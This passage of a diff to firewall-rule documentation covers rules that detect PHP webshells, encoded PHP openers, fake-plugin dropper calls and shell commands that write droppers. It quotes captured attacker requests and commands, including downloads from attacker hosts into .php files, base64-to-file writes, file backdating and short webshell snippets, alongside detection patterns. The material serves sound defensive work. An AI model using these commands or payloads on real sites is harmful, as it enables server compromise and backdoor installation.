-Collect their positions in the body. Fire if **any three** occurrences fall within a 300-byte window. The proximity gate is the FP-mitigation: legit code that uses these primitives in separate functions across hundreds of lines doesn't trip; nested-call-chain obfuscators always do.
-
-**Tag:** `DECODE_CHAIN`.
-
-**FP notes:** some WordPress plugins (security loggers, translation files, packaged archives via `pack`) do use multiple decoders — but in separate functions / methods, easily > 300 bytes apart. WP core itself uses `base64_decode` and `pack` in `wp-includes/pomo` but never three in proximity. Production data over a logonly week will confirm.
+**432 stays `logonly`:** a challenge converts to block for a cleared client
+(high-risk family), and the armed family can then 6 h-ban a logged-in customer
+uploading a PDF that contains `<?php` through a raw-body endpoint (multipart
+never trips 432: the body starts with the boundary). Promote only after
+post-clearance-converted hits are excluded from the autoblock feed.
 
 ### Rules 437 / 438 — `rule_php_encoded_opener` (JS `\x` hex-escape) · `rule_php_encoded_opener_b64` (base64)
 
-**Catches:** an encoded `<?php` opener in a body — a signal of payload smuggling through a filter that strips/blocks the literal opener, but *only* for encodings a normal client does not emit for content. **Split into two rule ids on 2026-07-02** (one detector, routed by encoding); **audit F16 (2026-07) then removed the URL / HTML-entity / JS-unicode forms** from 437 because they are the normal on-wire encoding of legitimate content, leaving only the two attack-shaped forms:
+One detector, two ids by encoding (base64 checked first):
 
-| Rule | Encoding | Bytes detected | Tag |
-|---|---|---|---|
-| **438** | Base64 of `<?php` | `PD9waHA` (boundary-anchored, case-sensitive) | `B64_PHP_OPENER` |
-| **437** | JS `\x` hex escape | `\x3c\x3fphp` | `JS_HEX_OPENER` |
+| Rule | Encoding | Bytes detected | Tag | Mode |
+|---|---|---|---|---|
+| **438** | base64 of `<?php` | `PD9waHA`, case-sensitive, at a base64 value boundary | `B64_PHP_OPENER` | `block` |
+| **437** | JS `\x` hex escape | `\x3c\x3fphp` (lowercased body) | `JS_HEX_OPENER` | `challenge_v2` |
 
-The detector checks base64 first, so a base64 opener is attributed to **438** and the hex-escape form to **437**.
+**Removed forms (audit F16).** URL (`%3C%3Fphp`), HTML-entity (`&lt;?php`) and
+JS-unicode openers are how legit content travels: a urlencoded body encodes a
+`<?php` typed into any field, rich-text editors escape pasted code, Go's
+`encoding/json` escapes `<`. A marker-bearing payload in those encodings is
+still caught by 404, which url-decodes the body. base64 `<?=` (`PD89`) is not
+matched: a 4-char token, 6/6 FP in review.
 
-**Why the removed forms were removed (F16):** the URL / HTML-entity / JS-unicode encodings are exactly how legit content is *transported*, not evasion, so they FP-challenged real comment / forum / API POSTs — and the traffic that *matters* is already covered elsewhere:
-- **`%3C%3Fphp` / `%3C%3F=` (URL):** an `application/x-www-form-urlencoded` body is url-encoded **in its entirety**, so a user who types `<?php` into any form field (blog comment, contact form, forum, paste tool) produces exactly `%3C%3Fphp` — indistinguishable from evasion. And the **PHP webshell-body scorer** (rule 404, `detect_php_webshell_body`) `normalize()`-url-decodes the body, so a **marker-bearing** payload (`<?php system($_GET…`) is caught by it (`<?php` + exec-marker + superglobal, at `challenge`) regardless of this rule.
-- **`&lt;?php` / `&#60;&#63;php` (HTML entity):** rich-text editors HTML-escape pasted code.
-- **JS-unicode `\uXXXX` opener:** Go's `encoding/json` (and many JS encoders) escape a literal `<` to its `\u`-prefixed form **by default**, so a JSON API echoing user content trips it.
+**Why these two remain.** A browser never base64-encodes a form field, and the
+boundary anchor drops mid-blob collisions (a product feed with base64-encoded
+code samples, the class of rule 326's `rO0AB`); a real smuggled opener starts
+its value (`?p=PD9waHA…`). A review found 16/16 base64 openers were botnet
+POSTs to `/xmlrpc.php`. 437 is the only coverage for a markerless hex opener:
+a form body cannot carry a literal `\x3c` (a backslash encodes as `%5C`), and
+`normalize()` does not unwrap `\xNN`, so 404 never sees it.
 
-**What remains (both attack-shaped, ~zero FP):**
-- **438 (base64):** a browser never base64-encodes a form field; the match is boundary-anchored + case-sensitive, so `PD9waHA` at a value boundary (`p=PD9waHA…`) only appears in deliberate smuggling. A 2026-07 six-server review found 16/16 base64 openers were botnet POSTs of base64 `<?php` to `/xmlrpc.php`, 0 FP. The promotion candidate (see FP notes).
-- **437 (JS `\x` hex escape):** `\x3c\x3fphp` is a raw `\xNN` byte-escape. A url-encoded backslash is `%5C`, so a form body cannot carry a literal `\x3c`; and `normalize()` does **not** unwrap `\xNN` (it decodes only `%xx`) — so rule 404 never sees a bare hex opener, making 437 the **only** coverage for a *markerless* hex opener (a marker-bearing one is still caught by 404). That non-redundancy, plus near-zero FP, is why it was kept when the redundant-and-FP-prone forms were cut.
+**Scope.** Both are suppressed on `/wp-admin/*` (WPCode / Code Snippets post
+base64 `<?php` there), except that 438 stays `logonly` on the pre-auth
+`admin-ajax.php` / `admin-post.php` (audit F11, FP case 5). 438 went to
+`block` on 2026-11-17 (14 hits in 7 days, all exploits: Bricks
+`render_element`, WP Project Manager `pm/v2`).
 
-**How:** the `\x` hex-escape form is matched as a substring on the lowercased body. The **base64** form (`PD9waHA`) is matched **case-sensitively** (base64 is a case-sensitive alphabet) and **only at a base64 value boundary** — string start or right after a non-base64 separator. The base64 `<?=` short-tag form (`PD89`) is **intentionally not matched**: a 4-char base64 token collides with legitimate base64 data (a 2026-06-25 review found it 6/6 FP), so it was removed.
-
-**FP notes:** **base64 boundary fix 2026-06-04.** The base64 check was originally a lowercased mid-blob substring scan (`has(s, "pd9waha")`), which collided with legitimate base64 *data* — a Google product-feed module (`techking.gr`, OpenCart `route=…/get_product_datas`) whose product text carried code samples, base64-encoded into the body. Same FP class as rule 326's `rO0AB`. The fix (case-sensitive + value-boundary) keeps every real smuggled opener — which always presents `PD9waHA…` at the *start* of a payload value, e.g. the captured live webshell feed `/wp-content/<rand>default.php?p=PD9waHA…` on `flow.gr` (a true positive) — while dropping mid-blob / case-variant collisions. **Both rules ship at `challenge` (promoted `logonly` → `challenge` 2026-06-25; split 2026-07-02; 437 narrowed to `\x` hex-escape by F16 2026-07).** 438 (base64) is the candidate for `block` after a 1-2 week burn-in of the per-rule-id split telemetry. `/wp-admin/*` paths are suppressed for both (WPCode / Code Snippets legitimately POST base64 `<?php` bodies there), with one **audit-F11 exception**: the pre-auth `admin-ajax.php` / `admin-post.php` endpoints keep 438 (base64) at `logonly` (detect-only, no enforcement) because they are reachable unauthenticated (`nopriv` actions) — the blanket "already gated by WP cookie-auth" assumption doesn't hold there. See FP case 5 for the full rationale. Any residual doc / security-research edge case is handled by per-vhost exclusion.
-
-### How they compose
-
-| Sample shape | Fires |
-|---|---|
-| `.htaccess` upload with `AddType … x-httpd-php` | 430 |
-| Obfuscator output with `$pool[N].$pool[N].$pool[N]…` | 431 |
-| Image / PDF upload with `<?php` past byte 64 | 432 |
-| Eval loader: `eval($a($b("LONG_B64")));` | 433 |
-| Minimalist webshell: `$_GET['c']($_GET['p']);` | 434 |
-| Concat funcname: `$a = "sys"."tem"; $a();` | 435 |
-| 3+ literal decoder primitives in close proximity | 436 |
-| `%3C%3Fphp…` (URL/HTML/JS encoded opener) in body | 437 |
-| `PD9waHA…` (base64 opener at a value boundary) in body | 438 |
-| Captured radio.php (PDF magic + char-pool + eval-loader) | **431 + 432 + 433** simultaneously |
-
-Rules 430-436 default to `logonly`; **437 is `challenge_v2` and 438 is `block`** (see their FP notes above). Operators tune per the standard playbook (one week of hit-rate data → promote to `challenge`, one more week → promote to `block`). Per-vhost exclusions apply normally: `cfm webtop waf exclude add /path/here --rule 430`.
+The captured radio.php (PDF magic + char-pool + eval loader) trips
+**431 + 432 + 433** at once.
 
 ---
 
 ## Rule 440 — `rule_plugin_dropper_cmd` (a fake plugin's command call)
 
-Reason family **`WAF_BACKDOOR`**, tag `PLUGIN_CMD:DOWNLOAD` / `PLUGIN_CMD:RUN`,
-**block** at the edge (the family's first block-tier rule). Its `waf_security`
-ban, and with it the alert, is **held in code** (`HoldAutoblock`, `RULE_440 = 0`)
-through a burn-in: `task=run` alone is the marker, and a page can make a
-visitor's browser send it (an `<img>` src), which would plant a 6 h node-wide ban
-on that visitor. A held block rule runs late in `cfm_waf.lua`, with the others,
-so it never shadows an armed rule's ban. `RULE_440 = 1` arms it. Since
-2026-11-04.
+Family **`WAF_BACKDOOR`**, tags `PLUGIN_CMD:DOWNLOAD` / `PLUGIN_CMD:RUN`,
+**`block`** at the edge. Its `waf_security` ban and alert are **held in code**
+(`HoldAutoblock`, `RULE_440 = 0`): `task=run` alone is the marker, and a page
+can make a visitor's browser send it (an `<img>` src), which would plant a 6 h
+node-wide ban on the visitor. `RULE_440 = 1` arms it. As a held block rule it
+runs late in `cfm_waf.lua`, so it never shadows an armed rule's ban.
 
-**What it stops.** The last step of a WordPress takeover seen on vol2.gr
-(titan): an IP logs in with a stolen password, uploads a plugin with a random
-name through `update.php?action=upload-plugin`, then calls the plugin's own PHP
-file to fetch and start the payload:
+**Why.** The last step of a WordPress takeover (vol2.gr, titan; the same
+operator in October): stolen login, a random-named plugin uploaded through
+`update.php?action=upload-plugin`, then
+`GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog`
+and `…?task=run`.
 
-```
-GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog
-GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=run
-```
+**Matches** a `.php` file (or PATH_INFO after one) under
+`/wp-content/plugins/` or `/wp-content/mu-plugins/`, any depth and install
+directory, whose `task` is `download` with a `url` field holding a URL, or
+`run`. Fields read as PHP registers them (`php_request_fields`: query, and a
+form body on a POST), every value, case and blanks ignored.
 
-The same operator made the same two calls in October with another plugin name
-(`wp-uxtczi5yl0`). Both uploads were refused upstream (Imunify), so the calls got
-404; on a site where the upload lands, this is the request that runs it.
+**FP evidence:** the October and November domlogs of seven nodes: no request
+to a PHP file under those directories carried `task` outside these attacks.
 
-**How.** A request to a `.php` file (or a PATH_INFO after one) under
-`/wp-content/plugins/` or `/wp-content/mu-plugins/`, at any depth and under any
-install directory, whose `task` field is `download` with a `url` field holding a
-URL (`DOWNLOAD`), or `run` (`RUN`). Fields are read as PHP registers them
-(`php_request_fields`: the query, and a form body on a POST), every value tested,
-case and surrounding blanks ignored.
-
-**FP read.** The October and November domlogs of seven nodes (titan, orion,
-mars, earth, virgo, rigel, speedhost): no request to a PHP file under those
-directories carried a `task` field outside these attacks. Joomla's `task=` on
-`/index.php` and `/administrator/` is not on that path.
-
-**Not covered.** A theme's PHP file, another content directory (Bedrock's
-`/app/plugins/`, a renamed `wp-content`), a directory index
-(`/wp-content/plugins/x/?task=run` reaching an `index.php`), another field name, a
-`url` without a scheme (`151.245.195.51/bog`, `//host/x`) or no `url` at all (the
-URL inside the dropper), a command in a header or a cookie, and a form body padded
-past `waf_body_max_len` (32 KB), which the edge does not read whole, or one it
-reads only in the body burn-in (chunked, no Content-Length, or over the read limit),
-where 440 is not enforced (`BURNIN_ENFORCE_IDS`) and its hit is logged: only the
-query is certain. The upload itself is not refused here: a logged-in upload is the
-administrator's own action, as far as the edge can tell.
+**Not covered.** A theme's PHP file; another content directory (Bedrock's
+`/app/plugins/`, a renamed `wp-content`); a directory index
+(`/wp-content/plugins/x/?task=run`); another field name; a `url` without a
+scheme (`151.245.195.51/bog`, `//host/x`) or no `url` (the URL inside the
+dropper); a command in a header or cookie; a form body padded past
+`waf_body_max_len` (32 KB), or read only in the body burn-in (chunked, no
+Content-Length, over the read limit), where 440 is not enforced
+(`BURNIN_ENFORCE_IDS`) and only logged: only the query is certain. The upload
+itself is not refused: a logged-in upload is the administrator's own action,
+as far as the edge can tell.
 
 ## Rule 331 — `rule_shell_write_exec` (a webshell terminal writing a dropper)
 
-Reason family **`WAF_RCE`**, logonly, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
-`WAF_RCE:SHELL_REDIRECT_TO_EXEC` and `WAF_RCE:SHELL_TOUCH_BACKDATE`.
+Family **`WAF_RCE`**, `logonly`, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
+`WAF_RCE:SHELL_REDIRECT_TO_EXEC`, `WAF_RCE:SHELL_TOUCH_BACKDATE`.
 
-The tophair.gr backdoor (2026-10-08) was a WPCode snippet serving a file
-manager and a terminal at `/?dark&term=1`. Its commands came as a form field
-in a POST body:
-- `wget -q https://kaye1337.pages.dev/stfu/m.jpg -O wp-admin/css/colors/midnight/colors.php`
-- `curl -o … .php`
-- `echo <base64> | base64 -d > upgrade.php`
-- `touch -d '2025-07-10 20:39' g.php`, to make the dropper look a year old.
+**Why.** The tophair.gr backdoor (2026-10-08), a WPCode snippet serving a
+terminal at `/?dark&term=1`, took commands as a POST form field:
+`wget -q https://…/m.jpg -O wp-admin/css/colors/midnight/colors.php`,
+`curl -o … .php`, `echo <base64> | base64 -d > upgrade.php`,
+`touch -d '2025-07-10 20:39' g.php`. Rules 310-317 read the query only.
 
-Rules 310-317 read the query string only, so a replay matched nothing.
-
-The rule reads the decoded, lowercased args and body (`get_norm_ab`: query,
-urlencoded, JSON and multipart values alike). It fires on a command at a
-command position:
-- the start of a value (`=`);
-- after `;`, `|`, `&`, a backtick, `$(` or a newline;
-- inside a JSON value (a quote after `:`, `[` or `,`) or `sh -c '…'`; a JSON
-  `\n` opens a command too.
-
-The raw surface is read as the shell would, with JSON's escapes. A JSON `\n`
-or `\r` ends a command, `\t` is a blank and `\"…\"` is a quoted string. A
-quote that closes the value the command sits in ends the command: a JSON
-string, a form field, or `sh -c '…'`. That is a quote followed by `,`, `}`,
-`]`, `:`, `&` or the end, or one with no closing quote. A second command in
-the same value is read on its own.
-
-The verb may sit behind an absolute path ending in `bin/` (`/usr/bin/wget`)
-or up to three prefix words: `sudo`, `nohup`, `env`, `exec`, `command`,
-`busybox`, `nice`, `time`, `xargs`, or an assignment (`HOME=/tmp wget`, never
-a form field's own `name=` at the start or after `&`). A bare `:` or `(`
-(`usage: echo …`) is prose, and a quote after anything else is markup
-(`class="cat"`). The command must do one of
-three things:
+**Matches**, on the decoded, lowercased args and body (`get_norm_ab`), a
+command at a command position (a value start, after `;` `|` `&` a backtick
+`$(` or a newline, inside a JSON value or `sh -c '…'`), the verb optionally
+behind a `…bin/` path or up to three prefix words (`sudo`, `nohup`, `env`,
+`exec`, `command`, `busybox`, `nice`, `time`, `xargs`, an assignment such as
+`HOME=/tmp wget`). It reads the surface as the shell would, quote-aware, with
+JSON's escapes. The command must:
 
 | Tag | Command |
 |---|---|
-| `FETCH_TO_EXEC` | `wget` / `curl` whose output goes to an executable name. The output is `-O` / `-o` (alone or closing a flag cluster such as `-qO`, `-sSLo`), `--output`, `--output-document[=]` or `-ox.php`, or the URL's own file name: `curl -O` / `--remote-name`, and `wget` with no output option (not `--spider` / `--delete-after`). That name is the URL path's last segment, with no query: wget keeps the query in the name (`wp-cron.php?doing_wp_cron`). `-O -` is stdout (the `wget -q -O - …/wp-cron.php` cron line), not a file. |
-| `REDIRECT_TO_EXEC` | `echo` / `printf` / `cat` / `base64` / `xxd` / `wget` / `curl` / `perl` / `python[3]` / `php` / `openssl` / `gzip` / `gunzip` with a `>`, `>>`, `>\|`, `&>` or `&>>` to an executable name, or `tee [-a]` of one after a pipe (`… \| base64 -d \| tee x.php`). |
-| `TOUCH_BACKDATE` | `touch` with `-d` / `-t` / `-r` (or a cluster carrying one), `--date` or `--reference` before its first operand (`--` ends the options). |
+| `FETCH_TO_EXEC` | `wget` / `curl` writing to an executable name: `-O` / `-o` (alone or ending a cluster), `--output`, `--output-document`, or the URL's own file name (`curl -O`, `wget` with no output option, not `--spider` / `--delete-after`). `-O -` is stdout (the `wget -q -O - …/wp-cron.php` cron line). |
+| `REDIRECT_TO_EXEC` | `echo` / `printf` / `cat` / `base64` / `xxd` / `wget` / `curl` / `perl` / `python[3]` / `php` / `openssl` / `gzip` / `gunzip` with `>`, `>>`, `>\|`, `&>`, `&>>` to an executable name, or `tee [-a]` of one after a pipe. |
+| `TOUCH_BACKDATE` | `touch` with `-d` / `-t` / `-r`, `--date` or `--reference` before its first operand. |
 
-Executable names are rule 401's PHP set (`_cve_sfl_has_exec_ext`: `.php`,
-`.php[0-9]*` such as the MultiPHP `.php74`, `.phtm[l]`, `.pht`, `.phar`), plus
-`.inc`, `.htaccess` and `.user.ini`. Only the last extension counts:
-`x.php.txt` is not run. The command is read quote-aware: a `;`
-inside quotes does not end it, and quotes are stripped from file names.
+Executable names: rule 401's PHP set (`_cve_sfl_has_exec_ext`: `.php`,
+`.php[0-9]*`, `.phtm[l]`, `.pht`, `.phar`) plus `.inc`, `.htaccess`,
+`.user.ini`; only the last extension counts (`x.php.txt` is not).
 
-**Why logonly.** Form values never carry these commands, but a tutorial pasted
-into a support ticket or a blog comment can, and so can staff saving a how-to
-post. Unlike 330 the rule has no logged-in / `/wp-admin/` exemption: a dropper
-like colors.php lives under `/wp-admin/`, and the attacker who planted it holds
-an admin cookie. That staff noise is expected in the burn-in review. Run over
-the query strings of titan's access logs (2026-10-27: 1 263 vhosts, 2.03 M
-requests with a query), it logged none; bodies are not in those logs. The
-family `WAF_RCE` is autoblock-armed for block hits only, so a 331 hit never
-bans. Promote it after
-a clean hit-rate review (`### Promoting a rule`).
+**Why logonly.** Form values never carry these, but a tutorial in a ticket or
+comment can, and so can staff saving a how-to post. There is deliberately no
+logged-in / `/wp-admin/` exemption: colors.php lives under `/wp-admin/`, and
+its planter holds an admin cookie. Over titan's access-log query strings
+(2026-10-27: 1 263 vhosts, 2.03 M queries) it logged none; bodies are not in
+those logs. `WAF_RCE` is armed for block hits only, so a 331 hit never bans.
+Promote after a clean hit-rate review.
 
-**Cost.** The verbs are found with plain finds, and each hit is judged by
-the byte before it. A class-pattern scan of the whole surface costs ~20 ns a
-byte in LuaJIT, about 400 µs on a 19 KB body. A body that names no
-executable file (`.ph`, `.inc`, `.htaccess`, `.user.ini`) reads `touch` alone,
-and returns after five plain finds when it has no `touch` either. The surface
-is read in place, never copied. Every read-back from a verb is bounded, and
-a verb's scan skips the occurrences inside the command it last parsed, so
-the cost is linear in the body. A command is read for at most 4 KB, 32 words
-and 256 special bytes (a quoted payload is one word and one step), and each
-verb parses at most 64 commands a request. Measured alone on
-a dev box:
-- under 1 µs on small requests, on 14 KB form posts and on 19 KB of prose
-  that names no executable file;
-- about 100-160 µs on 19 KB of prose, JSON or markup naming `.php` and a verb
-  on every line;
-- about 0.1-1.5 ms on a 32 KB body built for it: repeated `/touch`,
-  `sudo wget`, `=wget -x`, backslash runs, JSON values, assignments, pipes
-  (up to 4 s before these bounds).
+**Cost.** Plain finds, judged by the byte before; linear in the body. A body
+naming no executable file reads `touch` only. Bounds: per command 4 KB, 32
+words, 256 special bytes; per verb 64 commands a request. Measured alone:
+under 1 µs on ordinary requests, ~100-160 µs on 19 KB naming `.php` and a
+verb on every line, ~0.1-1.5 ms on a 32 KB body built against it (`check()`
+itself costs ~5-10 ms on 19-32 KB).
 
-A 19 KB body already costs `check()` about 5 ms, a 32 KB one about 10 ms.
-
-**Limits.**
-- A command is read for 4 KB, 32 words and 256 special bytes, and each verb
-  parses 64 commands. A real command placed behind 64 decoy commands of the
-  same verb is not read. Decoys of other verbs don't hide it.
-- The surface is lowercased, so wget's `-o` (log file) reads as `-O`
-  (output). `wget -o log.txt URL/x.php` counts as an output and hides the
-  download under the URL's name.
-- Shell tricks that hide the verb or the name defeat it: `w''get`, `$x`, `${IFS}`,
-  a relative path to the verb (`./wget`), a name built at run time, `cp` / `mv`
-  of a fetched file, a prefix outside the list above.
-- PHP's own writers (`file_put_contents`) are not shell commands: rules
-  404/433-436 judge PHP source.
+**Not covered.**
+- A real command behind 64 decoys of the same verb.
+- The surface is lowercased, so wget's `-o` (log file) reads as `-O`:
+  `wget -o log.txt URL/x.php` hides the download under the URL's name.
+- Shell tricks: `w''get`, `$x`, `${IFS}`, `./wget`, a name built at run time,
+  `cp` / `mv` of a fetched file, a prefix outside the list.
+- PHP's own writers (`file_put_contents`): rules 404 / 433-436 judge PHP.
 
 Tests: `scripts/tests/cfm_waf_shell_write_exec_test.lua`.
 
 ## Rules 332 and 416 — PHP code in the query, a PHP file as the body
 
-Added 2026-11-13 (logonly) after the dmkomotinis.gr Joomla compromise on
-earth (2026-11-12); both **block since 2026-11-17** after the burn-in below. Fabrik 3.10's listfilter evaluates
-`<element>[value]` when `<element>[eval]=1`, so the attacker:
-1. wrote files with `…[value]=$h=fopen('up.php','w');fwrite($h,chr(60).chr(63)…)`;
-2. got `up.php`, a dropper that writes `php://input` to `$_GET['f']`;
-3. POSTed the 58 KB yavuzshell.php to it as `application/octet-stream`, at
-   six paths.
+**Why.** The dmkomotinis.gr Joomla compromise (earth, 2026-11-12). Fabrik
+3.10's listfilter evaluates `<element>[value]` when `<element>[eval]=1`; the
+attacker wrote `up.php` with
+`…[value]=$h=fopen('up.php','w');fwrite($h,chr(60).chr(63)…)`, a dropper
+writing `php://input` to `$_GET['f']`, then POSTed the 58 KB yavuzshell.php
+to it as `application/octet-stream`. Every request reached the origin; the WAF
+logged nothing. The Fabrik `[eval]` index itself is rule 10029 (`WAF_CVE`,
+CVE-2026-67282, `block`, armed; `WAF_CVE.md`).
 
-Every request reached the origin (`up=cfm_apache`), and the WAF logged nothing
-but two Fetch Metadata notes. Imunify360 tracked the Fabrik requests
-(`77142206`, `77350942 Dangerous PHP functions in REQUEST_URI`, both
-`AccessDenied:false`). It only refused a request once it recognised the
-uploaded file on disk, and the bot then passed its splash and kept uploading.
-
-**Burn-in (2026-11-10..17, `cfm.waf.log` of the 8 edge nodes).**
-- 332: 44 hits from 34 IPs, every one an exploit — ThinkPHP / ThinkCMF
-  `file_put_contents`, pboot `{pboot:if(…)}`, Drupal `#post_render`,
-  `/cgi-bin/site_active.pl?TEMPLATE=…<?php system('id')…`, Magento
-  `/paypal/transparent/response/?<?=eval(…)`. Block, armed with `WAF_RCE`
-  (6 h ban). The cPanel json-api / execute saves listed as expected noise
-  below never reach it: those paths pass the panel gate before the WAF
-  (`cfm_panel_hosts.is_panel_api_or_sso`).
-- 416: 289 hits from 269 IPs, every one an exploit — the PHPUnit
-  `eval-stdin.php` sweep (275, labelled as a form), a PUT dropper
-  (`/wp-content/upgrade/wpr<N>.php`). Block with its ban held per rule
-  (`RULE_416 = 0`; ~40 bans a day armed), evaluated with the late group.
-  It skips a PUT / PATCH on a cPanel Web Disk host (`webdisk.<domain>`),
-  like Nextcloud's `/remote.php/`, only under cfm.lua Step 0d's gates
-  (`proxysubdomains=1`, `proxysubdomainsoverride=0`, a registrable domain):
-  the Host is the client's.
-
-The Fabrik `[eval]` index itself is rule 10029 (`WAF_CVE`, CVE-2026-67282,
-logonly; `WAF_CVE.md`).
+**Modes.** Both `block` since 2026-11-17, after a 7-day burn-in on the 8 edge
+nodes:
+- 332: 44 hits from 34 IPs, every one an exploit (ThinkPHP / ThinkCMF
+  `file_put_contents`, pboot `{pboot:if(…)}`, Drupal `#post_render`, a CGI
+  `TEMPLATE=…<?php system('id')`, Magento `/paypal/transparent/response/?<?=eval(…)`).
+  `WAF_RCE` is armed: a 332 hit bans (6 h).
+- 416: 289 hits from 269 IPs, every one an exploit (the PHPUnit
+  `eval-stdin.php` sweep, a PUT dropper). Its ban is held per rule
+  (`HoldAutoblock`, `RULE_416 = 0`; ~40 bans a day if armed), so the armed
+  `WAF_PHP_WEBSHELL_BODY` family bans nothing through 416. It runs with the
+  late (held) group.
 
 ### Rule 332 — `rule_php_code_args`
 
-Reason family **`WAF_RCE`**, reasons `WAF_RCE:PHP_ARGS_<TAG>`. It reads the
-query one parameter at a time. The raw query is split on `&` first, as PHP
-splits it, so an encoded `%26` (`&&` in a payload) stays in its parameter.
-Each parameter is then read with `+` as a space, url-decoded twice and
-lowercased. It fires on a
-call to a function that writes a file or runs code (`file_put_contents`,
+Family **`WAF_RCE`**, reasons `WAF_RCE:PHP_ARGS_<TAG>`. **Matches**, per query
+parameter (split on raw `&` as PHP does, `+` as space, url-decoded twice,
+lowercased), a call to a file writer or code runner (`file_put_contents`,
 `fopen`, `fwrite`, `fputs`, `file_get_contents`, `move_uploaded_file`,
 `shell_exec`, `passthru`, `system`, `exec`, `proc_open`, `popen`,
 `pcntl_exec`, `assert`, `eval`, `create_function`, `call_user_func[_array]`,
-`include[_once]`, `require[_once]`, `curl_exec`).
+`include[_once]`, `require[_once]`, `curl_exec`; not a method, a static
+method, a variable or part of a longer name) **together with** something only
+PHP source carries, in the same parameter. The tag names it: `OPEN` (`<?php`,
+`<?=`), `SUPERGLOBAL`, `DECODE` (`base64_decode(`, `hex2bin(`, `gzinflate(`,
+…), `RETURN`, `ASSIGN` (`$x =`), `DYNAMIC_CALL` (`$x(`), `CONCAT` (`'…'.'…'`),
+`CHR_CHAIN` (3+ `chr(`), `NAME_STRING` (a sink named in a string built from
+pieces, then called through `$x(` or `)(`).
 
-A call is `name(`, with blanks or one `/* */` comment allowed before the
-paren. `include` / `require` are language constructs, usually written without
-the paren, so for them a quote or a `$` after blanks also counts
-(`include $_GET['f'];`). It is not a call when the name is part of a longer name, a variable
-(`$exec(`), a method (`->exec(`) or a static method (`::system(`). The call
-must come with something only PHP source carries, which the tag names:
+**Why both halves.** Each alone occurs in real traffic: a static page linking
+`style.css?v=<?php echo rand(…); ?>` (Googlebot fetches it weekly), a search
+for `operating system (linux)`, Oracle / Postgres SQLi with `CHR()`.
 
-| Tag | Context |
-|---|---|
-| `OPEN` | `<?php` or `<?=` |
-| `SUPERGLOBAL` | `$_GET`, `$_POST`, `$_REQUEST`, `$_SERVER`, `$_COOKIE`, `$_FILES`, `$_ENV`, `$GLOBALS` |
-| `DECODE` | `base64_decode(`, `hex2bin(`, `gzinflate(`, `gzuncompress(`, `gzdecode(`, `str_rot13(`, `convert_uudecode(` |
-| `RETURN` | `return` after `;`, `=`, `&`, `?`, `(`, `)`, `{`, `}` or `:` |
-| `ASSIGN` | `$x =` |
-| `DYNAMIC_CALL` | `$x(` |
-| `CONCAT` | `'…'.'…'` |
-| `CHR_CHAIN` | three or more `chr(` |
-| `NAME_STRING` | no literal call: a sink named in a string built from pieces (`'file_put_'.'contents'`), then called through `$x(` or `)(` |
+**FP evidence:** 7 days of edge `access.log` on all 8 edge nodes: ~150
+matches from more than 10 exploit families (Fabrik, ThinkPHP, SPIP, Magento,
+ThinkCMF, Drupal, pearcmd), no legitimate one. Replayed over dmkomotinis.gr's
+raw log (1 386 queries) it matched every request of the chain that wrote a
+file (39), not the probes (`1;`, `sleep(3);`). Expected noise: a search for
+PHP code on a developer site. cPanel json-api / execute saves never reach it:
+they pass the panel gate before the WAF (`cfm_panel_hosts.is_panel_api_or_sso`).
 
-Neither half alone is enough, because the fleet read showed both alone in
-real traffic:
-- gerakinisshipping.com links `style.css?v=<?php echo rand(00000, 99999); ?>`
-  from a static page, and Googlebot fetches it 38 times a week. It has the
-  opener but no writer.
-- A search for `operating system (linux)` names a sink with no code around it.
-- `chr(` is not a sink: Oracle / Postgres SQLi builds strings with `CHR()`.
+**Not covered.** The query only. Fabrik (like most of these apps) reads
+`$_REQUEST`, so the same payload in a urlencoded body is not read by 332, and
+404 needs a `<?`, `$_`, `eval`, `system` or `exec` marker that
+`$h=fopen(…);fwrite($h,chr(…))` lacks. Reading form bodies needs editor
+exclusions first: planned as a separate logonly rule (form fields, JSON string
+values, cookies). **Order:** runs late, beside 331, so a payload that also
+trips an armed block rule keeps that rule's headline.
 
-**Fleet read before shipping** (2026-11-13, 7 days of edge `access.log`, all
-8 edge nodes): about 150 matching requests from more than 10 exploit
-families, and no legitimate one. Most of them reached the origin:
-- Fabrik (earth, virgo);
-- ThinkPHP `?s=<?=/**/file_put_contents("runtime/archive/xz.php",base64_decode(…))`
-  from one scanner across titan, rigel, mars, virgo and qualityweb;
-- SPIP `recherche=<?php …`;
-- Magento `/paypal/transparent/response/?<?=eval(hex2bin(…))`;
-- ThinkCMF `content=<php>file_put_contents(…)`;
-- Drupal `name[#suffix]=eval($_POST[c])`;
-- pearcmd `config-create /<?=@system(chr(…))`.
-
-Those figures came from a log scanner that mirrors the rule. The shipped
-detector was replayed over dmkomotinis.gr's raw edge log (1 386 queries) and
-matched 39: every request of the chain that wrote a file. It missed the
-attacker's probes (`1;`, `sleep(3);`) and one mangled payload that is not
-valid PHP (`\='file_put_'.'contents';return \(…`).
-
-The call and its context must sit in the same parameter:
-`?s=operating system (linux)&tpl='a'.'b'` is not PHP. Expected
-noise in the burn-in is a search for PHP code on a developer site
-(`?s=$x = file_get_contents(...)`), and cPanel json-api GETs that save a PHP
-file on the panel proxy hosts.
-
-**Limit.** The query only. Fabrik, like most of these apps, reads `$_REQUEST`,
-so the same payload sent as a urlencoded POST body is not read by 332. Rule
-404 reads form bodies but needs a `<?`, `$_`, `eval`, `system` or `exec`
-marker, and `$h=fopen(…);fwrite($h,chr(…))` carries none. Reading form bodies
-here needs editor exclusions first: the cPanel File Manager and theme
-editors post PHP source as a field. That is the next step (planned as a
-separate logonly rule: form fields, JSON string values, cookies). The rule runs late, beside 331, so a
-payload that also trips an armed block rule keeps that rule's headline.
+Tests: `scripts/tests/cfm_waf_php_code_args_test.lua`.
 
 ### Rule 416 — `rule_php_file_body`
 
-Reason family **`WAF_PHP_WEBSHELL_BODY`**, reasons
-`WAF_PHP_WEBSHELL_BODY:BODY_IS_<KIND>_<CT>`:
-- KIND `PHP_FILE`: the POST / PUT / PATCH body opens with `<?php` or `<?=`
-  (`php://input` reads the body of each method), after an
-  optional UTF-8 BOM and blanks;
-- KIND `GIF_POLYGLOT`: a `GIF87a`/`GIF89a` header with a PHP tag in the first
-  256 bytes;
-- CT `NONE`, `OCTET`, `TEXT`, `FORM`, `JSON`, `XML` or `OTHER` names the
-  Content-Type class.
